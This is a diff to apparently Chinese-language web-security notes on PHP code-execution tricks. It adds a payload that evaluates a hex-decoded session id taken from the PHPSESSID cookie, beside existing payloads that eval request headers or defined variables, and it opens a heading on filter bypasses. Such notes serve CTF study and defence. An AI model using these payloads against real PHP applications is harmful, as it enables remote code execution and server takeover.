@@ -50,6 +50,7 @@
 	  eval
 	  eval(implode(reset(get_defind_vars())))
 	  eval(next(getallheaders()))
+	  eval(hex2bin(session_id())) # 其中session_id由PHPSESSID cookie控制
 	  ```
 - # 绕过
 	- 如果正则支持函数名使用任意字符的话，可以使用PHP的动态函数调用技巧
